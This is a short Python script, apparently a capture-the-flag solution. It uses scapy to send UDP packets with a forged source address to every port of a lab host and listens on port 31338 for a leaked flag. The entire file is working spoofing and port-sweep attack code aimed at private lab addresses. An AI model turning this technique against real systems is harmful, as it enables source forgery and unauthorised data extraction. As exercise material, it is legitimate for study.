import socket
import threading
from concurrent.futures import ThreadPoolExecutor
from scapy.all import *

def listener():
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.bind(("0.0.0.0",31338))
    while True:
        data = s.recv(1024)
        print(data)

def sender(ports):
    for i in ports:
        #print(i)
        spoof_packet=IP(src="10.0.0.3",dst="10.0.0.2")/UDP(sport=31337,dport=i)/"FLAG:10.0.0.1:31338"
        send(spoof_packet,verbose=False) 



t = threading.Thread(target=listener,daemon=True)
t.start()

ports = list(range(1,65536))

sender(ports)

print("Done sending")